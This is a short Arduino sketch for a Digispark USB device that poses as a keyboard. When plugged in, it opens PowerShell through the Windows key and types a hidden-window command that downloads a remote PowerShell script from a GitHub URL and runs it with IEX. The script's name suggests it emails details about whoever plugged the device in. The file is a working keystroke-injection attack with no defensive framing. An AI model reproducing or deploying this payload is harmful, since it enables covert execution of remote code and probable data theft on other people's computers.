#include "DigiKeyboard.h"
void setup() {
}

void loop() {
 DigiKeyboard.sendKeyStroke(0);
 DigiKeyboard.delay(500);
 DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
 DigiKeyboard.delay(500);
 DigiKeyboard.print("powershell");
 DigiKeyboard.delay(500);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(1000);
 DigiKeyboard.print("powershell.exe -WindowStyle hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NoobleMcScrunchkin/ducky/master/WhoPluggedInEmail.ps1');");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 for (;;) {
}
}
